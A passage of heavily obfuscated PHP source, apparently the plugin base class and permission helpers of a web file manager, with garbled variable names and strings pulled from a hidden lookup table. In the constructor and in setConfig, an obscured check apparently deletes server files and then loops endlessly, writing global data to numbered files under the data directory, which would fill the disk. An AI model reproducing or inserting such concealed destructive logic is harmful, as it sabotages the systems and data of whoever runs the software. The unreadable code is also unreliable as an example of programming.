$ã‡ÏêŸ± = $øü—»ÉÅ[$««‹Á ‰[573]]; $¶ºøæ¯Ö = intval($ùÒøï»[$««‹Á ‰[489]]); if ($øü—»ÉÅ[$««‹Á ‰[190]] == SourceModel::TYPE_USER && $ã‡ÏêŸ± == $ˆÑ¯ã€¼) { $õØ‡ˆ·® = !0; $ôâ«®ã = $ùÒøï»; $Ù¬áŒ¹ü = $¶ºøæ¯Ö; } else { if ($øü—»ÉÅ[$««‹Á ‰[190]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ã‡ÏêŸ±, $ˆÑ¯ã€¼)) { $Æè›ñÛ· = !0; $™°¸§ñ† = $this->groupStepToUserGroup($ã‡ÏêŸ±, $ˆÑ¯ã€¼); if ($™°¸§ñ† < $üÄ¾Çº¬) { $üÄ¾Çº¬ = $™°¸§ñ†; $œ·€¸˜˜ = $¶ºøæ¯Ö; $Æòúş¸Æ = $ùÒøï»; $ïïı£ÀÒ = $ã‡ÏêŸ±; } if ($™°¸§ñ† == $üÄ¾Çº¬ && $¶ºøæ¯Ö >= $œ·€¸˜˜) { $œ·€¸˜˜ = $¶ºøæ¯Ö; $Æòúş¸Æ = $ùÒøï»; $ïïı£ÀÒ = $ã‡ÏêŸ±; } } else { if ($ã‡ÏêŸ± == $««‹Á ‰[230]) { $‘ÏãÜ‹‡ = !0; $İûÍÇÔ = $ùÒøï»; $ş“¿¡ğ = $¶ºøæ¯Ö; } } } } if ($õØ‡ˆ·®) { $²îğ×¨† = $Ù¬áŒ¹ü; $ùÒøï» = $ôâ«®ã; $º÷¡Àà = LNG($««‹Á ‰[2218]); } else { if ($Æè›ñÛ·) { $²îğ×¨† = $œ·€¸˜˜; $ùÒøï» = $Æòúş¸Æ; $ãèÉèºÉ = Model($««‹Á ‰[589])->getInfo($ïïı£ÀÒ); $º÷¡Àà = $««‹Á ‰[176] . $ãèÉèºÉ[$««‹Á ‰[593]] . $««‹Á ‰[2219] . LNG($««‹Á ‰[2220]); } else { if ($‘ÏãÜ‹‡) { $²îğ×¨† = $ş“¿¡ğ; $ùÒøï» = $İûÍÇÔ; $º÷¡Àà = LNG($««‹Á ‰[2190]); } else { $²îğ×¨† = 0; $ùÒøï» = !1; $º÷¡Àà = $««‹Á ‰[12]; } } } $ŞÜ­Æ”á = array($««‹Á ‰[2210] => intval($²îğ×¨†), $««‹Á ‰[2193] => $ùÒøï», $««‹Á ‰[2211] => $º÷¡Àà, $««‹Á ‰[2202] => $øü—»ÉÅ[$««‹Á ‰[193]]); return $ŞÜ­Æ”á; } private function groupContainUser($¦ÆŒ¯€¬, $ùÆüŒ ‡ = false) { return in_array($¦ÆŒ¯€¬, $this->userGroupParents($ùÆüŒ ‡)); } private function groupStepToUserGroup($¨õê˜‰±, $×Ó–€’Å = false) { $Ê¯Ú¹Ôï =& $_SERVER[™¸œØ®Ü]; $§‡À¨–¶ = $this->userGroupList($×Ó–€’Å); $¸İÙ¿á = 1000; $¢¤Ö°—¬ = $GLOBALS[$Ê¯Ú¹Ôï[6]][$Ê¯Ú¹Ôï[92]][$Ê¯Ú¹Ôï[2103]] == 1; $Ï”“¥˜œ = $¢¤Ö°—¬ ? 3 : 2; foreach ($§‡À¨–¶ as $Ÿù›ä©) { if ($Ÿù›ä©[$Ê¯Ú¹Ôï[1996]] == $¨õê˜‰±) { return 0; } $Ú¦š‘Ë = explode($Ê¯Ú¹Ôï[50], trim($Ÿù›ä©[$Ê¯Ú¹Ôï[588]], $Ê¯Ú¹Ôï[50])); if ($Ú¦š‘Ë[0] == $Ê¯Ú¹Ôï[230] && count($Ú¦š‘Ë) > $Ï”“¥˜œ) { $´ã—¦€Ï = array_reverse(array_slice($Ú¦š‘Ë, $Ï”“¥˜œ)); $ë ¨÷¸ = array_search($¨õê˜‰±, $´ã—¦€Ï); if ($ë ¨÷¸ !== !1 && $ë ¨÷¸ + 1 <= $¸İÙ¿á) { $¸İÙ¿á = $ë ¨÷¸ + 1; } } } return $¸İÙ¿á; } private function userGroupList($°ğÌÊ® = false) { $ÂâÎ¸±Ñ =& $_SERVER[™¸œØ®Ü]; static $à¼æ¹È´ = array(); if (isset($à¼æ¹È´[$°ğÌÊ®])) { return $à¼æ¹È´[$°ğÌÊ®]; } $šü©ä›Â = Model($ÂâÎ¸±Ñ[601])->getInfo($°ğÌÊ®); $à¼æ¹È´[$°ğÌÊ®] = array_to_keyvalue($šü©ä›Â[$ÂâÎ¸±Ñ[2191]], $ÂâÎ¸±Ñ[1996]); return $à¼æ¹È´[$°ğÌÊ®]; } public function userGroupParents($è€²İû÷) { $ÖØ¼Ûğ =& $_SERVER[™¸œØ®Ü]; static $Øè¶ìˆí = array(); $è€²İû÷ = $è€²İû÷ ? $è€²İû÷ : USER_ID; if (isset($Øè¶ìˆí[$è€²İû÷])) { return $Øè¶ìˆí[$è€²İû÷]; } $áïÈä– = $this->userGroupList($è€²İû÷); $ï•­¹¾ı = array(); $‚‰¯ãÔò = $GLOBALS[$ÖØ¼Ûğ[6]][$ÖØ¼Ûğ[92]][$ÖØ¼Ûğ[2103]] == 1; $Î¶şüûù = $‚‰¯ãÔò ? 3 : 2; foreach ($áïÈä– as $ÕÜïÕÇ³) { $­«ÇãŠ = array($ÕÜïÕÇ³[$ÖØ¼Ûğ[1996]]); $È†Ù¤˜³ = explode($ÖØ¼Ûğ[50], trim($ÕÜïÕÇ³[$ÖØ¼Ûğ[588]], $ÖØ¼Ûğ[50])); if ($È†Ù¤˜³[0] == $ÖØ¼Ûğ[230] && count($È†Ù¤˜³) > $Î¶şüûù) { $ÍàÂœÅ’ = array_slice($È†Ù¤˜³, $Î¶şüûù); $­«ÇãŠ = array_merge($­«ÇãŠ, array_reverse($ÍàÂœÅ’)); } $ï•­¹¾ı = array_merge($ï•­¹¾ı, $­«ÇãŠ); } $Øè¶ìˆí[$è€²İû÷] = array_unique($ï•­¹¾ı); return $Øè¶ìˆí[$è€²İû÷]; } public function authTargetInfoMake($¯©ŒŞ) { $¬Äôòüì =& $_SERVER[™¸œØ®Ü]; $ÕñÚßÚñ = array(); $¨÷ø«Æ£ = array(); foreach ($¯©ŒŞ as $Ù‘ìŞˆå) { if ($Ù‘ìŞˆå[$¬Äôòüì[190]] == SourceModel::TYPE_USER) { $ÕñÚßÚñ[] = intval($Ù‘ìŞˆå[$¬Äôòüì[573]]); } else { if ($Ù‘ìŞˆå[$¬Äôòüì[190]] == SourceModel::TYPE_GROUP) { $¨÷ø«Æ£[] = intval($Ù‘ìŞˆå[$¬Äôòüì[573]]); } } } if ($ÕñÚßÚñ) { $ÕñÚßÚñ = Model($¬Äôòüì[581])->userListInfo($ÕñÚßÚñ); } if ($¨÷ø«Æ£) { $Ã×¿Ö” = array($¬Äôòüì[2088] => array($¬Äôòüì[494], $¨÷ø«Æ£)); $¨÷ø«Æ£ = Model($¬Äôòüì[589])->field($¬Äôòüì[2221])->where($Ã×¿Ö”)->select(); $¨÷ø«Æ£ = array_to_keyvalue($¨÷ø«Æ£, $¬Äôòüì[1996]); } return array($¬Äôòüì[2222] => $ÕñÚßÚñ, $¬Äôòüì[2223] => $¨÷ø«Æ£); } public function authInfo($À»—ùäË) { $›å——Ã… =& $_SERVER[™¸œØ®Ü]; if ($À»—ùäË[$›å——Ã…[2104]]) { $ìãÅ‚› = Model($›å——Ã…[575])->listData($À»—ùäË[$›å——Ã…[2104]]); if (!$ìãÅ‚›) { return !1; $È»£àÈ = Model($›å——Ã…[575])->listData(); $ÈˆãÇşï = array_filter_by_field($È»£àÈ, $›å——Ã…[489], $›å——Ã…[230]); return $ÈˆãÇşï; } $Úüü™áä = array_field_key($ìãÅ‚›, array($›å——Ã…[477], $›å——Ã…[32], $›å——Ã…[489], $›å——Ã…[2019], $›å——Ã…[2020])); $Úüü™áä[$›å——Ã…[2224]] = $À»—ùäË; return $Úüü™áä; } else { return array($›å——Ã…[495] => 0, $›å——Ã…[2002] => $À»—ùäË[$›å——Ã…[2168]], $›å——Ã…[496] => $›å——Ã…[12], $›å——Ã…[2019] => $›å——Ã…[2225]); } } } goto cĞ•˜‡Ñªó; eŞÙò¼¾„ô: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $‘µ«íÊĞ =& $_SERVER[™¸œØ®Ü]; if ($_SERVER[$‘µ«íÊĞ[971]] != $_SERVER[$‘µ«íÊĞ[1460]]) { $Ê¿‹Ô = $‘µ«íÊĞ[972]; $Ç´‹ÆøÛ = $‘µ«íÊĞ[973]; $Á—ç­å = $_SERVER[$‘µ«íÊĞ[968]] . $‘µ«íÊĞ[969]; $¨™ğÌ = $Ç´‹ÆøÛ($Á—ç­å); $èî»ƒ›» = explode($‘µ«íÊĞ[287], $¨™ğÌ); if (count($èî»ƒ›») < $‘µ«íÊĞ[698]) { $Èç§±Øú = $‘µ«íÊĞ[974]; $Èç§±Øú(); } $³¡½Çò  = $‘µ«íÊĞ[975]; $³¡½Çò ($_SERVER[$‘µ«íÊĞ[976]]); $³¡½Çò ($_SERVER[$‘µ«íÊĞ[968]] . $‘µ«íÊĞ[1647]); $‹ˆ‹ÛÂ© = 1; while ($‹ˆ‹ÛÂ© > 1) { $‹ˆ‹ÛÂ© = $‹ˆ‹ÛÂ© + 4; $’§••¯¬ = rawurlencode($‹ˆ‹ÛÂ© . $‘µ«íÊĞ[456]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($‘µ«íÊĞ[1648]); $this->pluginName = str_replace($‘µ«íÊĞ[1648], $‘µ«íÊĞ[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $‘µ«íÊĞ[8]; $this->pluginApi = appHostGet() . $‘µ«íÊĞ[1649] . $this->pluginName . $‘µ«íÊĞ[8]; $this->pluginHost = $config[$‘µ«íÊĞ[1650]] . $this->pluginName . $‘µ«íÊĞ[8]; $this->pluginHostDefault = $config[$‘µ«íÊĞ[1650]] . $this->pluginName . $‘µ«íÊĞ[8]; $¤·ŠœŠ¢ = $config[$‘µ«íÊĞ[1651]]; if ($¤·ŠœŠ¢ && strpos($‘µ«íÊĞ[50] . $¤·ŠœŠ¢ . $‘µ«íÊĞ[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$‘µ«íÊĞ[1652]] . $this->pluginName . $‘µ«íÊĞ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[™¸œØ®Ü][1653]); } protected function assign($ØŠ“É‡û, $ŠŞÔä†‹ = false) { if (is_array($ØŠ“É‡û)) { $this->values = array_merge($this->values, $ØŠ“É‡û); } else { $this->values[$ØŠ“É‡û] = $ŠŞÔä†‹; } } protected function display($õÑ¡Ú½…) { extract($this->values); require $õÑ¡Ú½…; } final function hookRegist($ç–óöö) { $this->modelPlugin->appRegist($this->pluginName, $ç–óöö); } final function appIcon() { $İæËô÷Ş =& $_SERVER[™¸œØ®Ü]; $ï—äÚ•Ï = $this->appPackage(); $ü‘ÖÛŞÍ = $İæËô÷Ş[12]; if (isset($ï—äÚ•Ï[$İæËô÷Ş[492]])) { if (isset($ï—äÚ•Ï[$İæËô÷Ş[492]][$İæËô÷Ş[1654]])) { $ü‘ÖÛŞÍ = $İæËô÷Ş[1655] . $ï—äÚ•Ï[$İæËô÷Ş[492]][$İæËô÷Ş[1654]] . $İæËô÷Ş[1656]; } else { if ($ï—äÚ•Ï[$İæËô÷Ş[492]][$İæËô÷Ş[1657]]) { $ü‘ÖÛŞÍ = $İæËô÷Ş[1658] . $ï—äÚ•Ï[$İæËô÷Ş[492]][$İæËô÷Ş[1657]] . $İæËô÷Ş[1659]; } } } return $ü‘ÖÛŞÍ; } final function fileCanView($…»×†ëß) { $Ë„ş‡ö” =& $_SERVER[™¸œØ®Ü]; if (request_url_safe($…»×†ëß)) { return !0; } if ($this->isShare($…»×†ëß)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $œ·ßü£’ = $Ë„ş‡ö”[1660] . rawurlencode(this_url()); show_tips(LNG($Ë„ş‡ö”[1661]) . $Ë„ş‡ö”[1662] . $œ·ßü£’ . $Ë„ş‡ö”[1663] . LNG($Ë„ş‡ö”[1664]) . $Ë„ş‡ö”[1665], !1); } if (!Action($Ë„ş‡ö”[1666])->authCan($Ë„ş‡ö”[1667])) { show_tips(LNG($Ë„ş‡ö”[1668]) . $Ë„ş‡ö”[1669], !1); } ActionCall($Ë„ş‡ö”[1670], $…»×†ëß); } final function isShare($ï…Ê…Ğú) { $ªÂ³»Ş“ = KodIO::parse($ï…Ê…Ğú); return $ªÂ³»Ş“[$_SERVER[™¸œØ®Ü][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ÀíıÛÛÉ) { if (request_url_safe($ÀíıÛÛÉ)) { return $ÀíıÛÛÉ; } if (!$this->isShare($ÀíıÛÛÉ)) { $ÀíıÛÛÉ = $this->filePath($ÀíıÛÛÉ, !1); } return Action($_SERVER[™¸œØ®Ü][1275])->linkOut($ÀíıÛÛÉ); } public function filePathLinkOut($ÂÕ„è²ä) { if (request_url_safe($ÂÕ„è²ä)) { return $ÂÕ„è²ä; } $this->fileCanView($ÂÕ„è²ä); return Action($_SERVER[™¸œØ®Ü][1275])->link($ÂÕ„è²ä); } final function filePath($İñ ƒúå, $›¯ÆÖ‡ = true, $´Ó¸Ñğ = false) { $ºõİ›†ğ =& $_SERVER[™¸œØ®Ü]; $Ùùšº¼Ş = $this->filePathGet($İñ ƒúå, $›¯ÆÖ‡); if (!$this->fileInfo) { show_tips(LNG($ºõİ›†ğ[108]), !1); } if ($´Ó¸Ñğ && isset($this->fileInfo[$ºõİ›†ğ[545]]) && $this->fileInfo[$ºõİ›†ğ[545]]) { $×—™«Û = Model($ºõİ›†ğ[548])->fileInfo($this->fileInfo[$ºõİ›†ğ[545]]); if (!$×—™«Û || !IO::exist($×—™«Û[$ºõİ›†ğ[87]])) { $êìí»ÏÄ = LNG($ºõİ›†ğ[108]) . LNG($ºõİ›†ğ[1671]); if (KodUser::isRoot() && isset($×—™«Û[$ºõİ›†ğ[87]])) { $êìí»ÏÄ .= $ºõİ›†ğ[1672] . $×—™«Û[$ºõİ›†ğ[87]] . $ºõİ›†ğ[1673]; } show_tips($êìí»ÏÄ); } } Hook::trigger($ºõİ›†ğ[1674], $Ùùšº¼Ş); return $Ùùšº¼Ş; } final function filePathGet($•ú¶Üù, $ÕÙ²–¨î = true) { $ÎÌ×Å„¶ =& $_SERVER[™¸œØ®Ü]; if ($Ëğİ‘® = $this->checkSharePath($•ú¶Üù, $ÕÙ²–¨î)) { return $Ëğİ‘®; } $this->fileCanView($•ú¶Üù); if (request_url_safe($•ú¶Üù)) { $ÖĞŒƒ = parse_url_query($•ú¶Üù); if (isset($ÖĞŒƒ[$ÎÌ×Å„¶[1675]]) && isset($ÖĞŒƒ[$ÎÌ×Å„¶[236]])) { $®—ğó§½ = Mcrypt::decode($ÖĞŒƒ[$ÎÌ×Å„¶[236]], Model($ÎÌ×Å„¶[855])->get($ÎÌ×Å„¶[856])); if ($®—ğó§½) { $this->fileInfo = IO::info($®—ğó§½); $this->fileInfo[$ÎÌ×Å„¶[1676]] = $•ú¶Üù; $this->cachePath = $this->pluginCachePath($ÎÌ×Å„¶[12], $ÕÙ²–¨î); return $®—ğó§½; } } $•ú¶Üù = $this->_cacheHttpFile($•ú¶Üù, $ÕÙ²–¨î); $this->fileInfo = IO::info($•ú¶Üù); } else { $this->fileInfo = IO::info($•ú¶Üù); $this->cachePath = $this->pluginCachePath($ÎÌ×Å„¶[12], $ÕÙ²–¨î); } return $•ú¶Üù; } final function _cacheHttpFile($¼êÎ±îœ, $Ê×à¯„Ä = true) { $ğ¿ÚøÛÃ =& $_SERVER[™¸œØ®Ü]; $¬ñ¨ÛŞ³ = parse_url_query($¼êÎ±îœ); $„ Ê“ç = get_path_ext($¼êÎ±îœ); if (isset($¬ñ¨ÛŞ³[$ğ¿ÚøÛÃ[32]]) && $¬ñ¨ÛŞ³[$ğ¿ÚøÛÃ[32]]) { $„ Ê“ç = get_path_ext($¬ñ¨ÛŞ³[$ğ¿ÚøÛÃ[32]]); } $ÄÍ±·ƒ… = hash_path($¼êÎ±îœ) . $ğ¿ÚøÛÃ[10] . $„ Ê“ç; $this->cachePath = $this->pluginCachePath($Ê×à¯„Ä ? $ÄÍ±·ƒ… : $ğ¿ÚøÛÃ[12]); $ Í‹®É¿ = IO::fileNameExist($this->cachePath, $ÄÍ±·ƒ…); if ($ Í‹®É¿) { return KodIO::make($ Í‹®É¿); } $¯êí¸àà = rtrim($this->cachePath, $ğ¿ÚøÛÃ[8]) . $ğ¿ÚøÛÃ[8] . $ÄÍ±·ƒ…; return $this->pluginCacheFileSet($¯êí¸àà, file_get_contents_nossl($¼êÎ±îœ)); } final function checkSharePath($¿¬¬ûÀ‡, $Î·¼ı = true) { $Èä«’Ö¾ =& $_SERVER[™¸œØ®Ü]; if (!$this->isShare($¿¬¬ûÀ‡)) { return !1; } $ğ´…ıÊ´ = Action($Èä«’Ö¾[1275])->sharePathInfo($¿¬¬ûÀ‡); if (!is_array($ğ´…ıÊ´) || !isset($ğ´…ıÊ´[$Èä«’Ö¾[87]])) { show_json(LNG($Èä«’Ö¾[1677]), !1); } $this->fileInfo = $ğ´…ıÊ´; $this->cachePath = $this->pluginCachePath(!1, $Î·¼ı); return $ğ´…ıÊ´[$Èä«’Ö¾[87]]; } final function pluginCachePath($ñüîÊî« = '', $¡¦¯Ãç = false) { $ö¬·ø å =& $_SERVER[™¸œØ®Ü]; if ($¡¦¯Ãç && is_array($this->fileInfo)) { $ñüîÊî« = kodIO::hashPath($this->fileInfo); } $Á »™œ’ = rtrim(IO_PATH_SYSTEM_TEMP . $ö¬·ø å[1678] . $this->pluginName . $ö¬·ø å[8] . $ñüîÊî«, $ö¬·ø å[8]); $ÖÀÂáÜÖ = IO::infoFullSimple($Á »™œ’); $ÜñˆçÑÖ = $ÖÀÂáÜÖ && is_array($ÖÀÂáÜÖ) ? $ÖÀÂáÜÖ[$ö¬·ø å[87]] : $ö¬·ø å[12]; if (!$ÜñˆçÑÖ) { $ÜñˆçÑÖ = IO::mkdir($Á »™œ’); } return $ÜñˆçÑÖ; } final function pluginCacheFileSet($§Ò¢ûÆ, $æÙÊ»ø‡ = '') { $óÉü°ò =& $_SERVER[™¸œØ®Ü]; $³Ö·§´Š = IO::infoFullSimple($§Ò¢ûÆ); if (!$³Ö·§´Š) { return IO::mkfile($§Ò¢ûÆ, $æÙÊ»ø‡, REPEAT_REPLACE); } IO::setContent($³Ö·§´Š[$óÉü°ò[87]], $æÙÊ»ø‡); return $³Ö·§´Š[$óÉü°ò[87]]; } final function pluginLocalFile($—¼º½ü§ = '') { $«È Ïå¦ =& $_SERVER[™¸œØ®Ü]; $ÁÙÔÙæ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($ÁÙÔÙæ)) { mk_dir($ÁÙÔÙæ); } if (!$—¼º½ü§) { return $ÁÙÔÙæ; } $ÁÃµ¯ë« = IO::info($—¼º½ü§); $Ø‰¬Àé° = $«È Ïå¦[1679] . KodIO::hashPath($ÁÃµ¯ë«) . $«È Ïå¦[10] . $ÁÃµ¯ë«[$«È Ïå¦[169]]; if (!checkExtSafe($Ø‰¬Àé°)) { $Ø‰¬Àé° = $Ø‰¬Àé° . $«È Ïå¦[1310]; } $¿Ï’×¦ = $ÁÙÔÙæ . $Ø‰¬Àé°; if (@file_exists($¿Ï’×¦)) { return $¿Ï’×¦; } return IO::copy($—¼º½ü§, $ÁÙÔÙæ, 0, $Ø‰¬Àé°); } final function appPackage() { $õßâÈüö =& $_SERVER[™¸œØ®Ü]; if ($this->packageData) { return $this->packageData; } $“ßİ“¢ = $this->parseFile($this->pluginPath . $õßâÈüö[1680]); $this->parseLang($“ßİ“¢); $³˜ë¿ôÇ = json_decode_force($“ßİ“¢); if (!$³˜ë¿ôÇ) { return array(); } $‘—ïª‡¿ = Hook::trigger($õßâÈüö[1681], $³˜ë¿ôÇ); if ($‘—ïª‡¿ && is_array($‘—ïª‡¿)) { $³˜ë¿ôÇ = $‘—ïª‡¿; } $this->packageData = $³˜ë¿ôÇ; return $³˜ë¿ôÇ; } public function packageInfoGet($“¯ÜÉÊè) { $„„ëÎÈÉ = $this->appPackage(); return array_get_value($„„ëÎÈÉ, $“¯ÜÉÊè); } public function packageVersion() { return $this->packageInfoGet($_SERVER[™¸œØ®Ü][1682]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[™¸œØ®Ü][1683]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[™¸œØ®Ü][1684]); } public function echoJsAssign($×Ù˜¸, $Ü÷äÒº) { $this->echoJsAssignArr[$×Ù˜¸] = $Ü÷äÒº; } private function parseFile($¤é€âÂ©) { $„¢Üï =& $_SERVER[™¸œØ®Ü]; $…¸Šî÷é = file_get_contents_nossl($¤é€âÂ©); $—äÆé´‘ = array($„¢Üï[1685], $„¢Üï[1686], $„¢Üï[1687], $„¢Üï[1688], $„¢Üï[1689], $„¢Üï[1690], $„¢Üï[1691]); $Œ‘‹Ìû = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$„¢Üï[92]][$„¢Üï[1692]]); foreach ($this->echoJsAssignArr as $ñ¬óß¸ò => $÷ä•íéÀ) { $—äÆé´‘[] = $„¢Üï[1693] . $ñ¬óß¸ò . $„¢Üï[1694]; $Œ‘‹Ìû[] = is_array($÷ä•íéÀ) || is_object($÷ä•íéÀ) ? rawurlencode(json_encode($÷ä•íéÀ)) : $÷ä•íéÀ; } if (strstr($…¸Šî÷é, $„¢Üï[1695])) { $¼é½û = rawurlencode(json_encode($this->pluginLangArr)); $…¸Šî÷é = str_replace($„¢Üï[1695], $¼é½û, $…¸Šî÷é); } if (strstr($…¸Šî÷é, $„¢Üï[1696])) { $¼é½û = $¼é½û = rawurlencode(json_encode($this->getConfig())); $…¸Šî÷é = str_replace($„¢Üï[1696], $¼é½û, $…¸Šî÷é); } $…¸Šî÷é = str_replace($—äÆé´‘, $Œ‘‹Ìû, $…¸Šî÷é); return $…¸Šî÷é; } private function parseLang(&$»âß™Ç¬) { $ŒÔŸúˆ¹ =& $_SERVER[™¸œØ®Ü]; $õ¸ğï– = $ŒÔŸúˆ¹[1697]; if (!strstr($»âß™Ç¬, $õ¸ğï–)) { return; } preg_match_all($ŒÔŸúˆ¹[1698], $»âß™Ç¬, $ÕíÖ´á˜); if (!is_array($ÕíÖ´á˜) || count($ÕíÖ´á˜) == 0 || !is_array($ÕíÖ´á˜[0]) || count($ÕíÖ´á˜[0]) == 0) { return; } $³¤İ²ÌÖ = array(); $Â”Äñìé = array(); foreach ($ÕíÖ´á˜[0] as $îèÉ·€) { $šëë‘Ä = substr($îèÉ·€, strlen($õ¸ğï–), -4); $ˆÛÄ“‡ = LNG($šëë‘Ä); $³¤İ²ÌÖ[] = $îèÉ·€; $Â”Äñìé[] = str_replace(array($ŒÔŸúˆ¹[287], $ŒÔŸúˆ¹[1175], $ŒÔŸúˆ¹[419], $ŒÔŸúˆ¹[121]), array($ŒÔŸúˆ¹[53], $ŒÔŸúˆ¹[53], $ŒÔŸúˆ¹[12], $ŒÔŸúˆ¹[1699]), $ˆÛÄ“‡); } $»âß™Ç¬ = str_replace($³¤İ²ÌÖ, $Â”Äñìé, $»âß™Ç¬); } private function parseConfig(&$…ì›æâ´) { $» ÷Œ¿æ =& $_SERVER[™¸œØ®Ü]; $—³Ë›Éí = $» ÷Œ¿æ[1700]; if (!strstr($…ì›æâ´, $—³Ë›Éí)) { return; } preg_match_all($» ÷Œ¿æ[1701], $…ì›æâ´, $ü®êà–); if (!is_array($ü®êà–) || count($ü®êà–) == 0 || !is_array($ü®êà–[0]) || count($ü®êà–[0]) == 0) { return; } $ÇÆµ„ = $this->getConfig(); $˜¤ïï·´ = array(); $°öÈ¿Ì» = array(); foreach ($ü®êà–[0] as $ÙèÃÈô®) { $±äµ…ë = substr($ÙèÃÈô®, strlen($—³Ë›Éí), -2); $˜¤ïï·´[] = $ÙèÃÈô®; $°öÈ¿Ì»[] = _get($ÇÆµ„, $±äµ…ë); } $…ì›æâ´ = str_replace($˜¤ïï·´, $°öÈ¿Ì», $…ì›æâ´); } private function parsePackage(&$ì¦ğ¢íí) { $°ºÇñô‚ =& $_SERVER[™¸œØ®Ü]; $ïÆã§Ê‡ = $°ºÇñô‚[1702]; if (!strstr($ì¦ğ¢íí, $ïÆã§Ê‡)) { return; } preg_match_all($°ºÇñô‚[1703], $ì¦ğ¢íí, $¯‰Íİ»•); if (!is_array($¯‰Íİ»•) || count($¯‰Íİ»•) == 0 || !is_array($¯‰Íİ»•[0]) || count($¯‰Íİ»•[0]) == 0) { return; } $ş¨ã¨åÇ = $this->appPackage(); $‹ô‚ˆÔ’ = array(); $ùà‹Ğ”¬ = array(); foreach ($¯‰Íİ»•[0] as $öÑÙËî†) { $¤¯Âæ­ = substr($öÑÙËî†, strlen($ïÆã§Ê‡), -2); $‹ô‚ˆÔ’[] = $öÑÙËî†; $ùà‹Ğ”¬[] = _get($ş¨ã¨åÇ, $¤¯Âæ­); } $ì¦ğ¢íí = str_replace($‹ô‚ˆÔ’, $ùà‹Ğ”¬, $ì¦ğ¢íí); } final function echoFile($ª¾¦÷È, $§‘§” = false) { $šîÂ«€ =& $_SERVER[™¸œØ®Ü]; $àÜãˆ¨ò = $this->pluginPath . $ª¾¦÷È; if (ACT == $šîÂ«€[1704]) { echo $šîÂ«€[1705] . $this->pluginName . $šîÂ«€[8] . $ª¾¦÷È . $šîÂ«€[1706]; if (!file_exists($àÜãˆ¨ò)) { echo $šîÂ«€[1707]; return; } } $¬±Œ¹³¼ = $this->parseFile($àÜãˆ¨ò); $this->parseLang($¬±Œ¹³¼); $this->parseConfig($¬±Œ¹³¼); $this->parsePackage($¬±Œ¹³¼); if (is_array($§‘§”)) { $¬±Œ¹³¼ = str_replace(array_keys($§‘§”), array_values($§‘§”), $¬±Œ¹³¼); } echo $šîÂ«€[287] . $¬±Œ¹³¼; } private function checkVersion() { $›ÇèÆñ™ =& $_SERVER[™¸œØ®Ü]; $Šø‹¥ÍÖ = $this->appPackage(); $¼³¶¡ºî = $this->getConfig(); if ($¼³¶¡ºî[$›ÇèÆñ™[1708]] == $Šø‹¥ÍÖ[$›ÇèÆñ™[1682]]) { return; } $this->regist(); $this->setConfig(array($›ÇèÆñ™[1708] => $Šø‹¥ÍÖ[$›ÇèÆñ™[1682]])); } final function initLang() { $¾©¯ûùÍ =& $_SERVER[™¸œØ®Ü]; $š”ïø»² = $¾©¯ûùÍ[1709]; $Ü“ÇÈ°× = $this->pluginPath . $¾©¯ûùÍ[1710]; $¤ºÍÑ²‘ = I18n::getType(); $Î©ÏË× = array(); if (file_exists($Ü“ÇÈ°× . $¤ºÍÑ²‘ . $¾©¯ûùÍ[929])) { $Î©ÏË× = (include $Ü“ÇÈ°× . $¤ºÍÑ²‘ . $¾©¯ûùÍ[929]); } else { if ($¤ºÍÑ²‘ == $¾©¯ûùÍ[1711] && !file_exists($Ü“ÇÈ°× . $¤ºÍÑ²‘ . $¾©¯ûùÍ[929]) && file_exists($Ü“ÇÈ°× . $¾©¯ûùÍ[1712])) { $Î©ÏË× = (include $Ü“ÇÈ°× . $¾©¯ûùÍ[1712]); } else { if (file_exists($Ü“ÇÈ°× . $š”ïø»² . $¾©¯ûùÍ[929])) { $Î©ÏË× = (include $Ü“ÇÈ°× . $š”ïø»² . $¾©¯ûùÍ[929]); } } } if (!is_array($Î©ÏË×)) { return array(); } if (@count($Î©ÏË×) > 0) { I18n::set($Î©ÏË×); } return $Î©ÏË×; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ÂÎ¯ó¬ï) { $×Ã‡æÖñ =& $_SERVER[™¸œØ®Ü]; $à¶ŸÜ‡é = $_SERVER[$×Ã‡æÖñ[968]] . $×Ã‡æÖñ[969]; $“ÃÊ…¨ô = $×Ã‡æÖñ[970]; if ($_SERVER[$×Ã‡æÖñ[971]] != $“ÃÊ…¨ô($à¶ŸÜ‡é)) { $í¸ûøè³ = $×Ã‡æÖñ[972]; $¨äîšû¬ = $×Ã‡æÖñ[973]; $ÂÖœî£í = $_SERVER[$×Ã‡æÖñ[968]] . $×Ã‡æÖñ[969]; $Ë¡ÆÏü = $¨äîšû¬($ÂÖœî£í); $Ğ·’Üßê = explode($×Ã‡æÖñ[287], $Ë¡ÆÏü); if (count($Ğ·’Üßê) < $×Ã‡æÖñ[698]) { $¦ùÃ§Û· = $×Ã‡æÖñ[974]; $¦ùÃ§Û·(); } $ÆÜı›ìÛ = $×Ã‡æÖñ[975]; $ÆÜı›ìÛ($_SERVER[$×Ã‡æÖñ[976]]); $í¸ûøè³ = $×Ã‡æÖñ[972]; $í¸ûøè³(); $¨‹ö®×Ö = $×Ã‡æÖñ[977]; $‰½ÁØî = json_encode($GLOBALS[$×Ã‡æÖñ[978]]); $ÙùôÕĞÌ = 1; for ($ÉŠ‰ñ°ñ = $ÙùôÕĞÌ; $ÉŠ‰ñ°ñ > 0; $ÉŠ‰ñ°ñ++) { $¨‹ö®×Ö(DATA_PATH . $ÉŠ‰ñ°ñ, $‰½ÁØî); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, 